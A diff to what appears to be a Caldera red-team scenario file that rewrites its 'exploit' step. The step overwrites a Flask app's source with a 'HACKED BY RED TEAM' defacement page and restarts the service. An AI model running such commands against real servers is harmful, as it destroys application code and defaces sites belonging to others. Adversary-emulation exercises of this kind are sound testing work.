@@ -19,18 +19,7 @@ caldera:
   exploit:
     description: "Replace web app homepage with attacker defacement content"
     command: |
-      cat > /opt/flaskapp/app.py << 'PYEOF'
-from flask import Flask
-app = Flask(__name__)
-
-@app.route("/")
-def index():
-    return "<h1>HACKED BY RED TEAM</h1><p>This system has been compromised.</p>"
-
-@app.route("/admin")
-def admin():
-    return "<h1>Admin Panel</h1><p>Nothing to see here.</p>"
-PYEOF
+      printf 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef index():\n    return "<h1>HACKED BY RED TEAM</h1><p>This system has been compromised.</p>"\n\n@app.route("/admin")\ndef admin():\n    return "<h1>Admin Panel</h1><p>Nothing to see here.</p>"\n' > /opt/flaskapp/app.py
       systemctl restart flaskapp && echo "GOAL_ACHIEVED: website defaced"
 
 verification:
